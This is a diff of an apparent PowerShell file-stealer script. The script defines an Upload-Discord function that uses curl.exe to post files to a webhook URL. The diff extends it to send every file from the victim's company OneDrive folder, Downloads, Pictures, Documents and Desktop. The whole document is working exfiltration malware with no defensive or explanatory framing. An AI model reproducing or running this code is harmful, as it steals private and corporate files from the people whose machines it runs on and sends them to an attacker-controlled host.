@@ -22,8 +22,30 @@ if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 }
 
 $paths = Get-ChildItem -path "OneDrive - Thorengruppen"
-Get-ChildItem -path "OneDrive - Thorengruppen"
 foreach ($path in $paths){
   Upload-Discord -file "OneDrive - Thorengruppen\$path"
-  $path
 }
+
+$paths2 = Get-ChildItem -path "Downloads"
+foreach ($path2 in $paths2){
+  Upload-Discord -file "Downloads\$path2"
+}
+
+$paths3 = Get-ChildItem -path "Pictures"
+foreach ($path3 in $paths3){
+  Upload-Discord -file "Pictures\$path3"
+}
+
+$paths5 = Get-ChildItem -path "Documents"
+foreach ($path5 in $paths5){
+  Upload-Discord -file "Documents\$path5"
+}
+
+$paths4 = Get-ChildItem -path "Desktop"
+foreach ($path4 in $paths4){
+  Upload-Discord -file "Desktop\$path4"
+}
+
+
+
+
